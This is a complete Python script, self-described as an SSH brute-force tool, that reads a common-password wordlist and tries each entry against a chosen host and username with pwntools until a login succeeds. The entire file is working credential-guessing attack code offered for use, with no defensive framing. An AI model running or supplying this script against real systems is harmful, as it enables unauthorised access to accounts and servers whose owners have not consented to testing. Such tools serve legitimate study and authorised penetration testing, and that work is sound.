#!/bin/python3

import argparse
from pwn import * # to use the ssh
import paramiko  # For exceptions

def main():
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="SSH Brute-force script")
    parser.add_argument("host", type=str, help="The host to connect to")
    parser.add_argument("username", type=str, help="The username to use")
    parser.add_argument("--port", type=int, default=22, help="The port to connect to (default: 22)")
    args = parser.parse_args()

    host = args.host
    username = args.username
    port = args.port
    attempts = 0  # to track the attempts

    # File path for the password list
    password_list_path = "/usr/share/wordlists/seclists/SecLists-master/Passwords/Common-Credentials/10-million-password-list-top-100.txt"

    try:
        with open(password_list_path, "r") as password_list:  # Opening the wordlist and storing it as a list
            for password in password_list:
                password = password.strip("\n")  # Stripping password on basis of new line
                
                try:
                    print("[{}] Attempting password: '{}'!".format(attempts, password))
                    response = ssh(host=host, user=username, password=password, port=port, timeout=1)  # Connecting to the ssh using username, host, and password with a timeout of 1 second

                    if response.connected():
                        print("[>] Valid password found: '{}'!".format(password))  # If block to check if the connection is ok it exits the loop and ends everything
                        response.close()
                        break
                    response.close()  # In case passwords ended

                except paramiko.ssh_exception.AuthenticationException:
                    print("[X] Invalid Password")
                attempts += 1

    except FileNotFoundError:
        print(f"[!] Password list file not found: {password_list_path}")
    except Exception as e:
        print(f"[!] An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
